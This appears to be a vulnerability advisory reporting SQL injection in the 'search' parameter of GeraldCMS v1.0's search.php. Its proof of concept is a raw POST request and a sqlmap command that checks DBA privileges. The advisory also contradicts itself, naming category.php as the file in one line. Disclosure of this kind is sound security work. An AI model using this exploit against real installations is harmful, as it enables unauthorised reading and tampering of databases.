# GeraldCMS - SQL Injection (Search)

### Vendor Homepage:

> https://github.com/

### Software Link:

> [GeraldCMS](https://github.com/geraldib/GeraldCMS)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> /GeraldCMS-main/search.php

> The parameters `search` within category.php are vulnerable to SQL Injection.


![search](https://github.com/jxp98/VulResearch/blob/main/2024/02/img/2.4GeraldCMS-Sqli-Search.png)



### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### SQLMap

Save the following request to `search.txt`:

```
POST /GeraldCMS-main/search.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://172.16.8.56/GeraldCMS-main
Cookie: PHPSESSID=8cpurtnsagp762psve9s7ua633
Content-Length: 63
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Host: 172.16.8.56
Connection: Keep-alive

search=1*&submit=
```

Use `sqlmap` with `-r` option to exploit the vulnerability:

```
sqlmap -r search.txt  --batch --dbms MYSQL --is-dba
```


## Recommendations

When using this GeraldCMS, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
